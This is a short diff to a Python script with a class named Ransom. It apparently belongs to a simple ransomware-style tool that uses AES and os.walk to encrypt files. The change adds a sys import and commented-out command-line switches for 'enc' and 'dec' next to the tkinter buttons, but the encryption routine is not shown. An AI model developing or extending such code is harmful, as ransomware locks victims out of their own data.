@@ -5,6 +5,7 @@ from os import walk
 import os, random, struct
 from Crypto.Cipher import AES
 from Crypto import Random
+import sys
 import tkinter
 
 
@@ -118,6 +119,10 @@ class Ransom():
 
 
 if __name__ == "__main__":
+    # if(sys.argv[1]=='enc'):
+    #     Ransom.encrypt_button()
+    # elif(sys.argv[1]=='dec'):
+    #     Ransom.decrypt_button()
     top = tkinter.Tk()
     E = tkinter.Button(top,text='enc',command = Ransom.encrypt_button)
     E.pack()
